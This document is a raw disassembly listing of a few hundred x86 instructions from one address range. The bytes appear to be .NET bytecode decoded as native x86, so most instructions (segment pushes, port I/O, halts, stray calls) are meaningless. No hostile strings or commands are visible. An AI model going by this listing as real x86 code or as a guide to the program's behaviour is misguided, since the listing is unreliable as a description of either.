  403601:	02 00                	add    (%eax),%al
  403603:	00 06                	add    %al,(%esi)
  403605:	73 41                	jae    0x403648
  403607:	00 00                	add    %al,(%eax)
  403609:	0a 73 42             	or     0x42(%ebx),%dh
  40360c:	00 00                	add    %al,(%eax)
  40360e:	0a 0a                	or     (%edx),%cl
  403610:	06                   	push   %es
  403611:	17                   	pop    %ss
  403612:	6f                   	outsl  %ds:(%esi),(%dx)
  403613:	43                   	inc    %ebx
  403614:	00 00                	add    %al,(%eax)
  403616:	0a 06                	or     (%esi),%al
  403618:	28 45 00             	sub    %al,0x0(%ebp)
  40361b:	00 0a                	add    %cl,(%edx)
  40361d:	6f                   	outsl  %ds:(%esi),(%dx)
  40361e:	44                   	inc    %esp
  40361f:	00 00                	add    %al,(%eax)
  403621:	0a 20                	or     (%eax),%ah
  403623:	f4                   	hlt
  403624:	01 00                	add    %eax,(%eax)
  403626:	00 28                	add    %ch,(%eax)
  403628:	46                   	inc    %esi
  403629:	00 00                	add    %al,(%eax)
  40362b:	0a 28                	or     (%eax),%ch
  40362d:	47                   	inc    %edi
  40362e:	00 00                	add    %al,(%eax)
  403630:	0a 2d 07 28 48 00    	or     0x482807,%ch
  403636:	00 0a                	add    %cl,(%edx)
  403638:	2c 06                	sub    $0x6,%al
  40363a:	14 28                	adc    $0x28,%al
  40363c:	40                   	inc    %eax
  40363d:	00 00                	add    %al,(%eax)
  40363f:	0a 06                	or     (%esi),%al
  403641:	6f                   	outsl  %ds:(%esi),(%dx)
  403642:	49                   	dec    %ecx
  403643:	00 00                	add    %al,(%eax)
  403645:	0a 2d 06 14 28 40    	or     0x40281406,%ch
  40364b:	00 00                	add    %al,(%eax)
  40364d:	0a 20                	or     (%eax),%ah
  40364f:	e8 03 00 00 28       	call   0x28403657
  403654:	46                   	inc    %esi
  403655:	00 00                	add    %al,(%eax)
  403657:	0a 2b                	or     (%ebx),%ch
  403659:	d2 00                	rolb   %cl,(%eax)
  40365b:	00 1b                	add    %bl,(%ebx)
  40365d:	30 03                	xor    %al,(%ebx)
  40365f:	00 23                	add    %ah,(%ebx)
  403661:	00 00                	add    %al,(%eax)
  403663:	00 03                	add    %al,(%ebx)
  403665:	00 00                	add    %al,(%eax)
  403667:	11 73 4a             	adc    %esi,0x4a(%ebx)
  40366a:	00 00                	add    %al,(%eax)
  40366c:	0a 0a                	or     (%edx),%cl
  40366e:	06                   	push   %es
  40366f:	02 03                	add    (%ebx),%al
  403671:	28 04 00             	sub    %al,(%eax,%eax,1)
  403674:	00 06                	add    %al,(%esi)
  403676:	06                   	push   %es
  403677:	6f                   	outsl  %ds:(%esi),(%dx)
  403678:	02 00                	add    (%eax),%al
  40367a:	00 0a                	add    %cl,(%edx)
  40367c:	0b de                	or     %esi,%ebx
  40367e:	0a 06                	or     (%esi),%al
  403680:	2c 06                	sub    $0x6,%al
  403682:	06                   	push   %es
  403683:	6f                   	outsl  %ds:(%esi),(%dx)
  403684:	19 00                	sbb    %eax,(%eax)
  403686:	00 0a                	add    %cl,(%edx)
  403688:	dc 07                	faddl  (%edi)
  40368a:	2a 00                	sub    (%eax),%al
  40368c:	01 10                	add    %edx,(%eax)
  40368e:	00 00                	add    %al,(%eax)
  403690:	02 00                	add    (%eax),%al
  403692:	06                   	push   %es
  403693:	00 11                	add    %dl,(%ecx)
  403695:	17                   	pop    %ss
  403696:	00 0a                	add    %cl,(%edx)
  403698:	00 00                	add    %al,(%eax)
  40369a:	00 00                	add    %al,(%eax)
  40369c:	13 30                	adc    (%eax),%esi
  40369e:	05 00 61 00 00       	add    $0x6100,%eax
  4036a3:	00 00                	add    %al,(%eax)
  4036a5:	00 00                	add    %al,(%eax)
  4036a7:	00 02                	add    %al,(%edx)
  4036a9:	2d 0b 72 5d 00       	sub    $0x5d720b,%eax
  4036ae:	00 70 73             	add    %dh,0x73(%eax)
  4036b1:	4b                   	dec    %ebx
  4036b2:	00 00                	add    %al,(%eax)
  4036b4:	0a 7a 04             	or     0x4(%edx),%bh
  4036b7:	25 2d 06 26 73       	and    $0x7326062d,%eax
  4036bc:	e2 00                	loop   0x4036be
  4036be:	00 06                	add    %al,(%esi)
  4036c0:	10 02                	adc    %al,(%edx)
  4036c2:	04 6f                	add    $0x6f,%al
  4036c4:	e7 00                	out    %eax,$0x0
  4036c6:	00 06                	add    %al,(%esi)
  4036c8:	28 4f 00             	sub    %cl,0x0(%edi)
  4036cb:	00 06                	add    %al,(%esi)
  4036cd:	25 2c 14 02 04       	and    $0x402142c,%eax
  4036d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4036d3:	e7 00                	out    %eax,$0x0
  4036d5:	00 06                	add    %al,(%esi)
  4036d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4036d8:	4c                   	dec    %esp
  4036d9:	00 00                	add    %al,(%eax)
  4036db:	0a 02                	or     (%edx),%al
  4036dd:	1f                   	pop    %ds
  4036de:	28 6f 4d             	sub    %ch,0x4d(%edi)
  4036e1:	00 00                	add    %al,(%eax)
  4036e3:	0a 02                	or     (%edx),%al
  4036e5:	03 7e 3f             	add    0x3f(%esi),%edi
  4036e8:	00 00                	add    %al,(%eax)
  4036ea:	04 73                	add    $0x73,%al
  4036ec:	4e                   	dec    %esi
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	0a 04 28             	or     (%eax,%ebp,1),%al
  4036f2:	35 00 00 06 2c       	xor    $0x2c060000,%eax
  4036f7:	10 02                	adc    %al,(%edx)
  4036f9:	1f                   	pop    %ds
  4036fa:	29 6f 4d             	sub    %ebp,0x4d(%edi)
  4036fd:	00 00                	add    %al,(%eax)
  4036ff:	0a 02                	or     (%edx),%al
  403701:	1f                   	pop    %ds
  403702:	3b 6f 4d             	cmp    0x4d(%edi),%ebp
  403705:	00 00                	add    %al,(%eax)
  403707:	0a 2a                	or     (%edx),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	00 1b                	add    %bl,(%ebx)
  40370d:	30 05 00 41 00 00    	xor    %al,0x4100
  403713:	00 04 00             	add    %al,(%eax,%eax,1)
  403716:	00 11                	add    %dl,(%ecx)
  403718:	02 2d 20 03 14 28    	add    0x28140320,%ch
  40371e:	4f                   	dec    %edi
  40371f:	00 00                	add    %al,(%eax)
  403721:	0a 2c 02             	or     (%edx,%eax,1),%ch
  403724:	14 2a                	adc    $0x2a,%al
  403726:	03 6f 50             	add    0x50(%edi),%ebp
  403729:	00 00                	add    %al,(%eax)
  40372b:	0a 2d 02 14 2a 14    	or     0x142a1402,%ch
  403731:	03 16                	add    (%esi),%edx
  403733:	04 02                	add    $0x2,%al
  403735:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403738:	00 06                	add    %al,(%esi)
  40373a:	2a 02                	sub    (%edx),%al
  40373c:	73 51                	jae    0x40378f
  40373e:	00 00                	add    %al,(%eax)
  403740:	0a 0a                	or     (%edx),%cl
  403742:	06                   	push   %es
  403743:	03 04 28             	add    (%eax,%ebp,1),%eax
  403746:	08 00                	or     %al,(%eax)
  403748:	00 06                	add    %al,(%esi)
  40374a:	0b de                	or     %esi,%ebx
  40374c:	0a 06                	or     (%esi),%al
  40374e:	2c 06                	sub    $0x6,%al
  403750:	06                   	push   %es
  403751:	6f                   	outsl  %ds:(%esi),(%dx)
  403752:	19 00                	sbb    %eax,(%eax)
  403754:	00 0a                	add    %cl,(%edx)
  403756:	dc 07                	faddl  (%edi)
  403758:	2a 00                	sub    (%eax),%al
  40375a:	00 00                	add    %al,(%eax)
  40375c:	01 10                	add    %edx,(%eax)
  40375e:	00 00                	add    %al,(%eax)
  403760:	02 00                	add    (%eax),%al
  403762:	2a 00                	sub    (%eax),%al
  403764:	0b 35 00 0a 00 00    	or     0xa00,%esi
  40376a:	00 00                	add    %al,(%eax)
  40376c:	13 30                	adc    (%eax),%esi
  40376e:	05 00 67 00 00       	add    $0x6700,%eax
  403773:	00 05 00 00 11 02    	add    %al,0x2110000
  403779:	2d 0b 72 6b 00       	sub    $0x6b720b,%eax
  40377e:	00 70 73             	add    %dh,0x73(%eax)
  403781:	4b                   	dec    %ebx
  403782:	00 00                	add    %al,(%eax)
  403784:	0a 7a 04             	or     0x4(%edx),%bh
  403787:	25 2d 06 26 73       	and    $0x7326062d,%eax
  40378c:	e2 00                	loop   0x40378e
  40378e:	00 06                	add    %al,(%esi)
  403790:	10 02                	adc    %al,(%edx)
  403792:	03 14 28             	add    (%eax,%ebp,1),%edx
  403795:	4f                   	dec    %edi
  403796:	00 00                	add    %al,(%eax)
  403798:	0a 2d 12 03 d0 02    	or     0x2d00312,%ch
  40379e:	00 00                	add    %al,(%eax)
  4037a0:	01 28                	add    %ebp,(%eax)
  4037a2:	3c 00                	cmp    $0x0,%al
  4037a4:	00 0a                	add    %cl,(%edx)
  4037a6:	28 4f 00             	sub    %cl,0x0(%edi)
  4037a9:	00 0a                	add    %cl,(%edx)
  4037ab:	2c 08                	sub    $0x8,%al
  4037ad:	02 04 28             	add    (%eax,%ebp,1),%al
  4037b0:	28 00                	sub    %al,(%eax)
  4037b2:	00 06                	add    %al,(%esi)
  4037b4:	2a 02                	sub    (%edx),%al
  4037b6:	04 28                	add    $0x28,%al
  4037b8:	28 00                	sub    %al,(%eax)
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	0a 06                	or     (%esi),%al
  4037be:	2d 15 03 6f 50       	sub    $0x506f0315,%eax
  4037c3:	00 00                	add    %al,(%eax)
  4037c5:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  4037c8:	14 03                	adc    $0x3,%al
  4037ca:	16                   	push   %ss
  4037cb:	04 06                	add    $0x6,%al
  4037cd:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4037d0:	00 06                	add    %al,(%esi)
  4037d2:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  4037d5:	14 06                	adc    $0x6,%al
  4037d7:	03 04 28             	add    (%eax,%ebp,1),%eax
  4037da:	1d 00 00 06 2a       	sbb    $0x2a060000,%eax
  4037df:	00 1b                	add    %bl,(%ebx)
  4037e1:	30 03                	xor    %al,(%ebx)
  4037e3:	00 20                	add    %ah,(%eax)
  4037e5:	00 00                	add    %al,(%eax)
  4037e7:	00 06                	add    %al,(%esi)
  4037e9:	00 00                	add    %al,(%eax)
  4037eb:	11 02                	adc    %eax,(%edx)
  4037ed:	2d 01 2a 02 73       	sub    $0x73022a01,%eax
  4037f2:	51                   	push   %ecx
  4037f3:	00 00                	add    %al,(%eax)
  4037f5:	0a 0a                	or     (%edx),%cl
  4037f7:	06                   	push   %es
  4037f8:	03 04 28             	add    (%eax,%ebp,1),%eax
  4037fb:	0a 00                	or     (%eax),%al
  4037fd:	00 06                	add    %al,(%esi)
  4037ff:	de 0a                	fimuls (%edx)
  403801:	06                   	push   %es
  403802:	2c 06                	sub    $0x6,%al
  403804:	06                   	push   %es
  403805:	6f                   	outsl  %ds:(%esi),(%dx)
  403806:	19 00                	sbb    %eax,(%eax)
  403808:	00 0a                	add    %cl,(%edx)
  40380a:	dc 2a                	fsubrl (%edx)
  40380c:	01 10                	add    %edx,(%eax)
  40380e:	00 00                	add    %al,(%eax)
  403810:	02 00                	add    (%eax),%al
  403812:	0b 00                	or     (%eax),%eax
  403814:	0a 15 00 0a 00 00    	or     0xa00,%dl
  40381a:	00 00                	add    %al,(%eax)
  40381c:	13 30                	adc    (%eax),%esi
  40381e:	06                   	push   %es
  40381f:	00 6d 00             	add    %ch,0x0(%ebp)
  403822:	00 00                	add    %al,(%eax)
  403824:	07                   	pop    %es
  403825:	00 00                	add    %al,(%eax)
  403827:	11 04 25 2d 06 26 73 	adc    %eax,0x7326062d(,%eiz,1)
  40382e:	e2 00                	loop   0x403830
  403830:	00 06                	add    %al,(%esi)
  403832:	10 02                	adc    %al,(%edx)
  403834:	03 75 0a             	add    0xa(%ebp),%esi
  403837:	00 00                	add    %al,(%eax)
  403839:	01 0a                	add    %ecx,(%edx)
  40383b:	06                   	push   %es
  40383c:	2c 16                	sub    $0x16,%al
  40383e:	06                   	push   %es
  40383f:	6f                   	outsl  %ds:(%esi),(%dx)
  403840:	52                   	push   %edx
  403841:	00 00                	add    %al,(%eax)
  403843:	0a 2d 0e 02 75 09    	or     0x975020e,%ch
  403849:	00 00                	add    %al,(%eax)
  40384b:	01 06                	add    %eax,(%esi)
  40384d:	04 28                	add    $0x28,%al
  40384f:	0f 00 00             	sldt   (%eax)
  403852:	06                   	push   %es
  403853:	2a 02                	sub    (%edx),%al
  403855:	75 08                	jne    0x40385f
  403857:	00 00                	add    %al,(%eax)
  403859:	01 0b                	add    %ecx,(%ebx)
  40385b:	07                   	pop    %es
  40385c:	2c 09                	sub    $0x9,%al
  40385e:	07                   	pop    %es
  40385f:	03 04 28             	add    (%eax,%ebp,1),%eax
  403862:	19 00                	sbb    %eax,(%eax)
  403864:	00 06                	add    %al,(%esi)
  403866:	2a 03                	sub    (%ebx),%al
  403868:	2c 2a                	sub    $0x2a,%al
  40386a:	03 6f 53             	add    0x53(%edi),%ebp
  40386d:	00 00                	add    %al,(%eax)
  40386f:	0a 04 03             	or     (%ebx,%eax,1),%al
  403872:	02 14 14             	add    (%esp,%edx,1),%dl
  403875:	28 0d 00 00 06 0c    	sub    %cl,0xc060000
  40387b:	08 2c 16             	or     %ch,(%esi,%edx,1)
  40387e:	08 03                	or     %al,(%ebx)
  403880:	6f                   	outsl  %ds:(%esi),(%dx)
  403881:	52                   	push   %edx
  403882:	00 00                	add    %al,(%eax)
  403884:	06                   	push   %es
  403885:	03 02                	add    (%edx),%eax
  403887:	75 09                	jne    0x403892
  403889:	00 00                	add    %al,(%eax)
  40388b:	01 08                	add    %ecx,(%eax)
  40388d:	04 28                	add    $0x28,%al
  40388f:	0e                   	push   %cs
  403890:	00 00                	add    %al,(%eax)
  403892:	06                   	push   %es
  403893:	2a 2a                	sub    (%edx),%ch
  403895:	00 00                	add    %al,(%eax)
  403897:	00 1b                	add    %bl,(%ebx)
  403899:	30 06                	xor    %al,(%esi)
  40389b:	00 a4 00 00 00 08 00 	add    %ah,0x80000(%eax,%eax,1)
  4038a2:	00 11                	add    %dl,(%ecx)
  4038a4:	05 6f 02 01 00       	add    $0x1026f,%eax
  4038a9:	06                   	push   %es
  4038aa:	2c 54                	sub    $0x54,%al
  4038ac:	73 54                	jae    0x403902
  4038ae:	00 00                	add    %al,(%eax)
  4038b0:	0a 0a                	or     (%edx),%cl
  4038b2:	06                   	push   %es
  4038b3:	72 87                	jb     0x40383c
  4038b5:	00 00                	add    %al,(%eax)
  4038b7:	70 04                	jo     0x4038bd
  4038b9:	8c 5d 00             	mov    %ds,0x0(%ebp)
  4038bc:	00 01                	add    %al,(%ecx)
  4038be:	6f                   	outsl  %ds:(%esi),(%dx)
  4038bf:	55                   	push   %ebp
  4038c0:	00 00                	add    %al,(%eax)
  4038c2:	0a 06                	or     (%esi),%al
  4038c4:	72 a3                	jb     0x403869
  4038c6:	00 00                	add    %al,(%eax)
  4038c8:	70 0e                	jo     0x4038d8
  4038ca:	04 6f                	add    $0x6f,%al
  4038cc:	55                   	push   %ebp
  4038cd:	00 00                	add    %al,(%eax)
  4038cf:	0a 14 03             	or     (%ebx,%eax,1),%dl
  4038d2:	06                   	push   %es
  4038d3:	05 14 02 73 14       	add    $0x14730214,%eax
  4038d8:	01 00                	add    %eax,(%eax)
  4038da:	06                   	push   %es
  4038db:	0b 07                	or     (%edi),%eax
  4038dd:	1b 6f 1a             	sbb    0x1a(%edi),%ebp
  4038e0:	01 00                	add    %eax,(%eax)
  4038e2:	06                   	push   %es
  4038e3:	05 6f 02 01 00       	add    $0x1026f,%eax
  4038e8:	06                   	push   %es
  4038e9:	07                   	pop    %es
  4038ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4038eb:	10 01                	adc    %al,(%ecx)
  4038ed:	00 06                	add    %al,(%esi)
  4038ef:	07                   	pop    %es
  4038f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4038f1:	1b 01                	sbb    (%ecx),%eax
  4038f3:	00 06                	add    %al,(%esi)
  4038f5:	2c 09                	sub    $0x9,%al
  4038f7:	07                   	pop    %es
  4038f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4038f9:	1f                   	pop    %ds
  4038fa:	01 00                	add    %eax,(%eax)
  4038fc:	06                   	push   %es
  4038fd:	0c de                	or     $0xde,%al
  4038ff:	46                   	inc    %esi
  403900:	03 6f 56             	add    0x56(%edi),%ebp
  403903:	00 00                	add    %al,(%eax)
  403905:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  403908:	03 6f 57             	add    0x57(%edi),%ebp
  40390b:	00 00                	add    %al,(%eax)
  40390d:	0a 04 28             	or     (%eax,%ebp,1),%al
  403910:	58                   	pop    %eax
  403911:	00 00                	add    %al,(%eax)
  403913:	0a 0c de             	or     (%esi,%ebx,8),%cl
  403916:	2f                   	das
  403917:	03 28                	add    (%eax),%ebp
  403919:	59                   	pop    %ecx
  40391a:	00 00                	add    %al,(%eax)
  40391c:	0a 0c de             	or     (%esi,%ebx,8),%cl
  40391f:	26 0d 72 af 00 00    	es or  $0xaf72,%eax
  403925:	70 03                	jo     0x40392a
  403927:	6f                   	outsl  %ds:(%esi),(%dx)
  403928:	5a                   	pop    %edx
  403929:	00 00                	add    %al,(%eax)
  40392b:	0a 72 32             	or     0x32(%edx),%dh
  40392e:	01 00                	add    %eax,(%eax)
  403930:	70 28                	jo     0x40395a
  403932:	5b                   	pop    %ebx
  403933:	00 00                	add    %al,(%eax)
  403935:	0a 09                	or     (%ecx),%cl
  403937:	73 31                	jae    0x40396a
  403939:	01 00                	add    %eax,(%eax)
  40393b:	06                   	push   %es
  40393c:	05 28 30 00 00       	add    $0x3028,%eax
  403941:	06                   	push   %es
  403942:	14 0c                	adc    $0xc,%al
  403944:	de 00                	fiadds (%eax)
  403946:	08 2a                	or     %ch,(%edx)
  403948:	01 10                	add    %edx,(%eax)
  40394a:	00 00                	add    %al,(%eax)
  40394c:	00 00                	add    %al,(%eax)
  40394e:	00 00                	add    %al,(%eax)
  403950:	7c 7c                	jl     0x4039ce
  403952:	00 26                	add    %ah,(%esi)
  403954:	0e                   	push   %cs
  403955:	00 00                	add    %al,(%eax)
  403957:	01 13                	add    %edx,(%ebx)
  403959:	30 06                	xor    %al,(%esi)
  40395b:	00 48 01             	add    %cl,0x1(%eax)
  40395e:	00 00                	add    %al,(%eax)
  403960:	09 00                	or     %eax,(%eax)
  403962:	00 11                	add    %dl,(%ecx)
  403964:	03 6f 08             	add    0x8(%edi),%ebp
  403967:	01 00                	add    %eax,(%eax)
  403969:	06                   	push   %es
  40396a:	2c 5c                	sub    $0x5c,%al
  40396c:	73 54                	jae    0x4039c2
  40396e:	00 00                	add    %al,(%eax)
  403970:	0a 0a                	or     (%edx),%cl
  403972:	06                   	push   %es
  403973:	72 42                	jb     0x4039b7
  403975:	01 00                	add    %eax,(%eax)
  403977:	70 0e                	jo     0x403987
  403979:	04 6f                	add    $0x6f,%al
  40397b:	55                   	push   %ebp
  40397c:	00 00                	add    %al,(%eax)
  40397e:	0a 06                	or     (%esi),%al
  403980:	72 58                	jb     0x4039da
  403982:	01 00                	add    %eax,(%eax)
  403984:	70 02                	jo     0x403988
  403986:	6f                   	outsl  %ds:(%esi),(%dx)
  403987:	55                   	push   %ebp
  403988:	00 00                	add    %al,(%eax)
  40398a:	0a 14 05 06 03 0e 05 	or     0x50e0306(,%eax,1),%dl
  403991:	04 73                	add    $0x73,%al
  403993:	14 01                	adc    $0x1,%al
  403995:	00 06                	add    %al,(%esi)
  403997:	0b 07                	or     (%edi),%eax
  403999:	1e                   	push   %ds
  40399a:	6f                   	outsl  %ds:(%esi),(%dx)
  40399b:	1a 01                	sbb    (%ecx),%al
  40399d:	00 06                	add    %al,(%esi)
  40399f:	03 6f 08             	add    0x8(%edi),%ebp
  4039a2:	01 00                	add    %eax,(%eax)
  4039a4:	06                   	push   %es
  4039a5:	07                   	pop    %es
  4039a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4039a7:	10 01                	adc    %al,(%ecx)
  4039a9:	00 06                	add    %al,(%esi)
  4039ab:	07                   	pop    %es
  4039ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ad:	1b 01                	sbb    (%ecx),%eax
  4039af:	00 06                	add    %al,(%esi)
  4039b1:	2c 15                	sub    $0x15,%al
  4039b3:	06                   	push   %es
  4039b4:	72 58                	jb     0x403a0e
  4039b6:	01 00                	add    %eax,(%eax)
  4039b8:	70 12                	jo     0x4039cc
  4039ba:	02 6f 5c             	add    0x5c(%edi),%ch
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 26                	or     (%esi),%ah
  4039c1:	08 75 03             	or     %dh,0x3(%ebp)
  4039c4:	00 00                	add    %al,(%eax)
  4039c6:	02 2a                	add    (%edx),%ch
  4039c8:	02 d0                	add    %al,%dl
  4039ca:	08 00                	or     %al,(%eax)
  4039cc:	00 1b                	add    %bl,(%ebx)
  4039ce:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4039d1:	00 0a                	add    %cl,(%edx)
  4039d3:	28 4f 00             	sub    %cl,0x0(%edi)
  4039d6:	00 0a                	add    %cl,(%edx)
  4039d8:	2c 02                	sub    $0x2,%al
  4039da:	14 2a                	adc    $0x2a,%al
  4039dc:	d0 26                	shlb   $1,(%esi)
  4039de:	00 00                	add    %al,(%eax)
  4039e0:	01 28                	add    %ebp,(%eax)
  4039e2:	3c 00                	cmp    $0x0,%al
  4039e4:	00 0a                	add    %cl,(%edx)
  4039e6:	02 6f 5d             	add    0x5d(%edi),%ch
  4039e9:	00 00                	add    %al,(%eax)
  4039eb:	0a 2c 06             	or     (%esi,%eax,1),%ch
  4039ee:	73 bf                	jae    0x4039af
  4039f0:	00 00                	add    %al,(%eax)
  4039f2:	06                   	push   %es
  4039f3:	2a 02                	sub    (%edx),%al
  4039f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f6:	5e                   	pop    %esi
  4039f7:	00 00                	add    %al,(%eax)
  4039f9:	0a 2c 42             	or     (%edx,%eax,2),%ch
  4039fc:	02 6f 5f             	add    0x5f(%edi),%ch
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	0a d0                	or     %al,%dl
  403a03:	25 00 00 01 28       	and    $0x28010000,%eax
  403a08:	3c 00                	cmp    $0x0,%al
  403a0a:	00 0a                	add    %cl,(%edx)
  403a0c:	28 4f 00             	sub    %cl,0x0(%edi)
  403a0f:	00 0a                	add    %cl,(%edx)
  403a11:	2c 2b                	sub    $0x2b,%al
  403a13:	d0 0d 00 00 02 28    	rorb   $1,0x28020000
  403a19:	3c 00                	cmp    $0x0,%al
  403a1b:	00 0a                	add    %cl,(%edx)
  403a1d:	17                   	pop    %ss
  403a1e:	8d 06                	lea    (%esi),%eax
  403a20:	00 00                	add    %al,(%eax)
  403a22:	01 25 16 02 6f 60    	add    %esp,0x606f0216
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 16                	or     (%esi),%dl
  403a2c:	9a a2 6f 61 00 00 0a 	lcall  $0xa00,$0x616fa2
  403a33:	28 59 00             	sub    %bl,0x0(%ecx)
  403a36:	00 0a                	add    %cl,(%edx)
  403a38:	74 03                	je     0x403a3d
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	02 2a                	add    (%edx),%ch
  403a3e:	02 6f 62             	add    0x62(%edi),%ch
  403a41:	00 00                	add    %al,(%eax)
  403a43:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  403a49:	59                   	pop    %ecx
  403a4a:	09 11                	or     %edx,(%ecx)
  403a4c:	04 9a                	add    $0x9a,%al
  403a4e:	13 05 11 05 6f 5e    	adc    0x5e6f0511,%eax
  403a54:	00 00                	add    %al,(%eax)
  403a56:	0a 2c 44             	or     (%esp,%eax,2),%ch
  403a59:	11 05 6f 5f 00 00    	adc    %eax,0x5f6f
  403a5f:	0a d0                	or     %al,%dl
  403a61:	25 00 00 01 28       	and    $0x28010000,%eax
  403a66:	3c 00                	cmp    $0x0,%al
  403a68:	00 0a                	add    %cl,(%edx)
  403a6a:	28 4f 00             	sub    %cl,0x0(%edi)
  403a6d:	00 0a                	add    %cl,(%edx)
  403a6f:	2c 2c                	sub    $0x2c,%al
  403a71:	d0 0d 00 00 02 28    	rorb   $1,0x28020000
  403a77:	3c 00                	cmp    $0x0,%al
  403a79:	00 0a                	add    %cl,(%edx)
  403a7b:	17                   	pop    %ss
  403a7c:	8d 06                	lea    (%esi),%eax
  403a7e:	00 00                	add    %al,(%eax)
  403a80:	01 25 16 11 05 6f    	add    %esp,0x6f051116
  403a86:	60                   	pusha
  403a87:	00 00                	add    %al,(%eax)
  403a89:	0a 16                	or     (%esi),%dl
  403a8b:	9a a2 6f 61 00 00 0a 	lcall  $0xa00,$0x616fa2
  403a92:	28 59 00             	sub    %bl,0x0(%ecx)
  403a95:	00 0a                	add    %cl,(%edx)
  403a97:	74 03                	je     0x403a9c
  403a99:	00 00                	add    %al,(%eax)
  403a9b:	02 2a                	add    (%edx),%ch
  403a9d:	11 04 17             	adc    %eax,(%edi,%edx,1)
  403aa0:	58                   	pop    %eax
  403aa1:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403aa4:	04 09                	add    $0x9,%al
  403aa6:	8e 69 32             	mov    0x32(%ecx),%gs
  403aa9:	a0 14 2a 1b 30       	mov    0x301b2a14,%al
  403aae:	05 00 a7 01 00       	add    $0x1a700,%eax
  403ab3:	00 0a                	add    %cl,(%edx)
  403ab5:	00 00                	add    %al,(%eax)
  403ab7:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403aba:	51                   	push   %ecx
  403abb:	00 00                	add    %al,(%eax)
  403abd:	06                   	push   %es
  403abe:	2d 01 2a 04 6f       	sub    $0x6f042a01,%eax
  403ac3:	55                   	push   %ebp
  403ac4:	00 00                	add    %al,(%eax)
  403ac6:	06                   	push   %es
  403ac7:	2c 48                	sub    $0x48,%al
  403ac9:	04 6f                	add    $0x6f,%al
  403acb:	55                   	push   %ebp
  403acc:	00 00                	add    %al,(%eax)
  403ace:	06                   	push   %es
  403acf:	72 62                	jb     0x403b33
  403ad1:	01 00                	add    %eax,(%eax)
  403ad3:	70 72                	jo     0x403b47
  403ad5:	70 01                	jo     0x403ad8
  403ad7:	00 70 6f             	add    %dh,0x6f(%eax)
  403ada:	63 00                	arpl   %eax,(%eax)
  403adc:	00 0a                	add    %cl,(%edx)
  403ade:	04 6f                	add    $0x6f,%al
  403ae0:	55                   	push   %ebp
  403ae1:	00 00                	add    %al,(%eax)
  403ae3:	06                   	push   %es
  403ae4:	72 79                	jb     0x403b5f
  403ae6:	00 00                	add    %al,(%eax)
  403ae8:	70 02                	jo     0x403aec
  403aea:	6f                   	outsl  %ds:(%esi),(%dx)
  403aeb:	63 00                	arpl   %eax,(%eax)
  403aed:	00 0a                	add    %cl,(%edx)
  403aef:	04 6f                	add    $0x6f,%al
  403af1:	55                   	push   %ebp
  403af2:	00 00                	add    %al,(%eax)
  403af4:	06                   	push   %es
  403af5:	72 7a                	jb     0x403b71
  403af7:	01 00                	add    %eax,(%eax)
  403af9:	70 03                	jo     0x403afe
  403afb:	6f                   	outsl  %ds:(%esi),(%dx)
  403afc:	63 00                	arpl   %eax,(%eax)
  403afe:	00 0a                	add    %cl,(%edx)
  403b00:	04 6f                	add    $0x6f,%al
  403b02:	55                   	push   %ebp
  403b03:	00 00                	add    %al,(%eax)
  403b05:	06                   	push   %es
  403b06:	72 86                	jb     0x403a8e
  403b08:	01 00                	add    %eax,(%eax)
  403b0a:	70 05                	jo     0x403b11
  403b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  403b0d:	63 00                	arpl   %eax,(%eax)
  403b0f:	00 0a                	add    %cl,(%edx)
  403b11:	03 39                	add    (%ecx),%edi
  403b13:	11 01                	adc    %eax,(%ecx)
  403b15:	00 00                	add    %al,(%eax)
  403b17:	04 6f                	add    $0x6f,%al
  403b19:	51                   	push   %ecx
  403b1a:	00 00                	add    %al,(%eax)
  403b1c:	06                   	push   %es
  403b1d:	75 0a                	jne    0x403b29
  403b1f:	00 00                	add    %al,(%eax)
  403b21:	01 0a                	add    %ecx,(%edx)
  403b23:	16                   	push   %ss
  403b24:	0b 16                	or     (%esi),%edx
  403b26:	0c 06                	or     $0x6,%al
  403b28:	2c 10                	sub    $0x10,%al
  403b2a:	06                   	push   %es
  403b2b:	16                   	push   %ss
  403b2c:	6f                   	outsl  %ds:(%esi),(%dx)
  403b2d:	64 00 00             	add    %al,%fs:(%eax)
  403b30:	0a 0c 06             	or     (%esi,%eax,1),%cl
  403b33:	16                   	push   %ss
  403b34:	6f                   	outsl  %ds:(%esi),(%dx)
  403b35:	65 00 00             	add    %al,%gs:(%eax)
  403b38:	0a 0b                	or     (%ebx),%cl
  403b3a:	04 6f                	add    $0x6f,%al
  403b3c:	51                   	push   %ecx
  403b3d:	00 00                	add    %al,(%eax)
  403b3f:	06                   	push   %es
  403b40:	6f                   	outsl  %ds:(%esi),(%dx)
  403b41:	53                   	push   %ebx
  403b42:	00 00                	add    %al,(%eax)
  403b44:	0a 28                	or     (%eax),%ch
  403b46:	1b 00                	sbb    (%eax),%eax
  403b48:	00 06                	add    %al,(%esi)
  403b4a:	0d 03 6f 18 00       	or     $0x186f03,%eax
  403b4f:	00 0a                	add    %cl,(%edx)
  403b51:	13 04 38             	adc    (%eax,%edi,1),%eax
  403b54:	ad                   	lods   %ds:(%esi),%eax
  403b55:	00 00                	add    %al,(%eax)
  403b57:	00 11                	add    %dl,(%ecx)
  403b59:	04 6f                	add    $0x6f,%al
  403b5b:	06                   	push   %es
  403b5c:	00 00                	add    %al,(%eax)
  403b5e:	0a 13                	or     (%ebx),%dl
